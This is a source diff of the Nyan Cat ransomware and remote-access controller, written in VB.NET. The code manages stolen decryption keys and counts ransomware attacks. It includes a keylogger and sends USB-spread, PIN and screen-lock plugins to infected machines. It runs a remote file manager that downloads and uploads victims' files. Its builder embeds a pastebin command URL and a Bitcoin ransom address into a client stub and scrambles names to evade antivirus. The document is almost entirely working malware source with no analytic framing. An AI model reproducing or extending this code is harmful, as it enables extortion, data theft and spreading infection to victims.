@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/03/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/05/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -574,10 +574,6 @@ Public Class Main
                     IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
                     Exit Select
 
-                Case "DEL-KEY"
-                    IO.File.Delete(uFolder(A(1), "KEY.txt"))
-                    Exit Select
-
                 Case "SC"
                     IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
                     Exit Select
@@ -622,6 +618,7 @@ Public Class Main
                         If A(2) = "Error " Then
                             FM.BackToolStripMenuItem.PerformClick()
                             FM.Label2.Text = A(3)
+                            Return
                         Else
                             FM.L1.Items.Clear()
                             Dim allFiles As String() = Split(A(2), "|SPL_FM|")
@@ -683,9 +680,73 @@ Public Class Main
                                 FM.L1.Items.Add(itm)
                                 i += 1
                             Next
+                            Try
+                                If A(3).ToString.Length > 3 Then
+                                    FM.Label1.Text = A(3) + "\"
+                                End If
+                            Catch ex As Exception
+                            End Try
+                            FM.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                         End If
                     End If
                     Exit Select
+
+                Case "DW"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        IO.File.WriteAllBytes(uFolder(A(1) + "\Downloads", A(3)), Convert.FromBase64String(A(2)))
+                        FM.Label2.Text = "Download Finish " + A(3)
+                    End If
+                    Exit Select
+
+                Case "UP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        FM.RefreshList()
+                        FM.Label2.Text = "Upload Finish " + A(2)
+                    End If
+                    Exit Select
+
+                Case "DEL"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        FM.RefreshList()
+                    End If
+                    Exit Select
+
+                Case "PRE"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        Dim MM = New IO.MemoryStream(SB(A(2)))
+                        FM.PictureBox1.Image = Bitmap.FromStream(MM)
+                        FM.Label2.ForeColor = Color.Lime
+                        FM.Label2.Text = "Preview Size " & siz(A(2).Length)
+                        FM.PictureBox1.Visible = True
+                        MM.Dispose()
+                    End If
+                    Exit Select
+
+
 #End Region
 
 #Region "Keylogger"
@@ -720,23 +781,23 @@ Public Class Main
                         Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))
 
                         If HASH = A(1) Then
-                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(file)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
+                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(file), True)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
                         End If
                     Next
                     Exit Select
 
                 Case "PLUSB"
-                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll")) + SPL + "_USB")
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll"), True)) + SPL + "_USB")
                     Exit Select
 
                 Case "PLPIN"
-                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll")) + SPL + "_PIN")
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
                     Exit Select
 #End Region
 
             End Select
         Catch ex As Exception
-            MsgBox(ex.Message)
+            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
     End Sub
 #End Region
@@ -902,7 +963,7 @@ Public Class Main
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Try
-            MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
+            MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
         Catch ex As Exception
         End Try
     End Sub
@@ -1063,7 +1124,7 @@ Public Class Main
         End Try
     End Sub
 
-    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
+    Private Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(ID.Index).Text)
@@ -1091,7 +1152,18 @@ Public Class Main
         End Try
     End Sub
 
-    Private Sub LockScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockScreenToolStripMenuItem.Click
+    Private Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
@@ -1151,7 +1223,7 @@ Public Class Main
 
         If o.ShowDialog = Windows.Forms.DialogResult.OK Then
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
+                S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)) & SPL & "update")
             Next
         End If
     End Sub
@@ -1229,7 +1301,7 @@ Public Class Main
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
 
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
+                    S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
                 Next
             End If
         Catch ex As Exception
@@ -1342,120 +1414,123 @@ Public Class Main
                     _exe.Text = _exe.Text + ".exe"
                 End If
 
-                '  If _path2.Text.StartsWith("\") Then
-                '  _path2.Text = _path2.Text.Replace("\", "")
-                'End If
+                If Not _path2.Text.StartsWith("\") Then
+                    _path2.Text = "\" + _path2.Text
+                End If
+                If Not _path2.Text.EndsWith("\") Then
+                    _path2.Text = _path2.Text + "\"
+                End If
 
                 If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.exe") Then
-                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
-                    Return
-                ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
-                    MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
-                    Return
-                Else
+                        MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
+                        Return
+                    ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
+                        MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
+                        Return
+                    Else
 
-                    Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
-                    If chkRename.Checked Then
-                        definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
-                    End If
-                    Dim definition2 As ModuleDefinition
-                    For Each definition2 In definition.Modules
+                        Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
                         If chkRename.Checked Then
-                            definition2.Name = Randomi(rand.Next(6, 20))
+                            definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
                         End If
-                        Dim definition3 As TypeDefinition
-                        For Each definition3 In definition2.Types
+                        Dim definition2 As ModuleDefinition
+                        For Each definition2 In definition.Modules
                             If chkRename.Checked Then
-                                ' If definition3.Namespace = "Client.Lime" Then
-                                definition3.Namespace = Randomi(rand.Next(6, 20))
-                                definition3.Name = Randomi(rand.Next(6, 20))
-                                '  End If
-                                For Each F In definition3.Fields
-                                    F.Name = Randomi(rand.Next(6, 20))
-                                Next
+                                definition2.Name = Randomi(rand.Next(10, 30))
                             End If
-                            Dim definition4 As MethodDefinition
-                            For Each definition4 In definition3.Methods
-                                If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
-                                    If chkRename.Checked Then
-                                        definition4.Name = Randomi(rand.Next(6, 20))
-                                        For Each P As ParameterDefinition In definition4.Parameters
-                                            P.Name = Randomi(rand.Next(6, 20))
-                                        Next
-                                    End If
-                                ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
-                                    Dim enumerator As IEnumerator(Of Instruction)
-                                    Try
-                                        enumerator = definition4.Body.Instructions.GetEnumerator
-                                        Do While enumerator.MoveNext
-                                            Dim current As Instruction = enumerator.Current
-                                            If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
-                                                Dim str As String = current.Operand.ToString
-                                                If (str = "%Delay%") Then
-                                                    current.Operand = _numDelay.Value.ToString
-                                                End If
-                                                If (str = "%Pastebin%") Then
-                                                    current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
-                                                End If
-                                                If (str = "%EXE%") Then
-                                                    current.Operand = _exe.Text
-                                                End If
-                                                If (str = "%SPL%") Then
-                                                    current.Operand = S_Settings.SPL
-                                                End If
-                                                If (str = "%KEY%") Then
-                                                    current.Operand = S_Settings.KEY
-                                                End If
-                                                If (str = "%PASS%") Then
-                                                    current.Operand = S_Settings.EncryptionKey
-                                                End If
-                                                If (str = "%DROP%") Then
-                                                    current.Operand = _drop.Checked.ToString
-                                                End If
-                                                If (str = "%PATH1%") Then
-                                                    current.Operand = _path1.Text
-                                                End If
-                                                If (str = "%PATH2%") Then
-                                                    current.Operand = _path2.Text
-                                                End If
-                                                If (str = "%BTC_ADDR%") Then
-                                                    current.Operand = _btc.Text
-                                                End If
-                                                If (str = "%USB%") Then
-                                                    current.Operand = _usb.Checked.ToString
-                                                End If
-                                                If (str = "%PIN%") Then
-                                                    current.Operand = _pin.Checked.ToString
-                                                End If
-                                                If (str = "%ANTI%") Then
-                                                    current.Operand = _anti.Checked.ToString
-                                                End If
-                                                If (str = "%DWN_CHK%") Then
-                                                    current.Operand = _dwnchk.Checked.ToString
-                                                End If
-                                                If (str = "%DWN_LINK%") Then
-                                                    current.Operand = _dwnlink.Text
-                                                End If
-                                            End If
-                                        Loop
-                                    Finally
-                                    End Try
-
+                            Dim definition3 As TypeDefinition
+                            For Each definition3 In definition2.Types
+                                If chkRename.Checked Then
+                                    ' If definition3.Namespace = "Client.Lime" Then
+                                    definition3.Namespace = Randomi(rand.Next(10, 30))
+                                    definition3.Name = Randomi(rand.Next(10, 30))
+                                    '  End If
+                                    For Each F In definition3.Fields
+                                        F.Name = Randomi(rand.Next(10, 30))
+                                    Next
                                 End If
+                                Dim definition4 As MethodDefinition
+                                For Each definition4 In definition3.Methods
+                                    If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
+                                        If chkRename.Checked Then
+                                            definition4.Name = Randomi(rand.Next(10, 30))
+                                            For Each P As ParameterDefinition In definition4.Parameters
+                                                P.Name = Randomi(rand.Next(5, 10))
+                                            Next
+                                        End If
+                                    ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
+                                        Dim enumerator As IEnumerator(Of Instruction)
+                                        Try
+                                            enumerator = definition4.Body.Instructions.GetEnumerator
+                                            Do While enumerator.MoveNext
+                                                Dim current As Instruction = enumerator.Current
+                                                If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
+                                                    Dim str As String = current.Operand.ToString
+                                                    If (str = "%Delay%") Then
+                                                        current.Operand = _numDelay.Value.ToString
+                                                    End If
+                                                    If (str = "%Pastebin%") Then
+                                                        current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
+                                                    End If
+                                                    If (str = "%EXE%") Then
+                                                        current.Operand = _exe.Text
+                                                    End If
+                                                    If (str = "%SPL%") Then
+                                                        current.Operand = S_Settings.SPL
+                                                    End If
+                                                    If (str = "%KEY%") Then
+                                                        current.Operand = S_Settings.KEY
+                                                    End If
+                                                    If (str = "%PASS%") Then
+                                                        current.Operand = S_Settings.EncryptionKey
+                                                    End If
+                                                    If (str = "%DROP%") Then
+                                                        current.Operand = _drop.Checked.ToString
+                                                    End If
+                                                    If (str = "%PATH1%") Then
+                                                        current.Operand = _path1.Text
+                                                    End If
+                                                    If (str = "%PATH2%") Then
+                                                        current.Operand = _path2.Text
+                                                    End If
+                                                    If (str = "%BTC_ADDR%") Then
+                                                        current.Operand = _btc.Text
+                                                    End If
+                                                    If (str = "%USB%") Then
+                                                        current.Operand = _usb.Checked.ToString
+                                                    End If
+                                                    If (str = "%PIN%") Then
+                                                        current.Operand = _pin.Checked.ToString
+                                                    End If
+                                                    If (str = "%ANTI%") Then
+                                                        current.Operand = _anti.Checked.ToString
+                                                    End If
+                                                    If (str = "%DWN_CHK%") Then
+                                                        current.Operand = _dwnchk.Checked.ToString
+                                                    End If
+                                                    If (str = "%DWN_LINK%") Then
+                                                        current.Operand = _dwnlink.Text
+                                                    End If
+                                                End If
+                                            Loop
+                                        Finally
+                                        End Try
+
+                                    End If
+                                Next
                             Next
                         Next
-                    Next
 
-                    definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
-                    If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
-                        S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW CLIENT.exe", PictureBox1.ImageLocation)
+                        definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
+                        If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
+                            S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW CLIENT.exe", PictureBox1.ImageLocation)
+                        End If
+                        MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
+                        My.Settings.Save()
+                        definition.Dispose()
+                        Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                     End If
-                    MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
-                    My.Settings.Save()
-                    definition.Dispose()
-                    Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                 End If
-            End If
         Catch ex1 As Exception
             MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
             Return
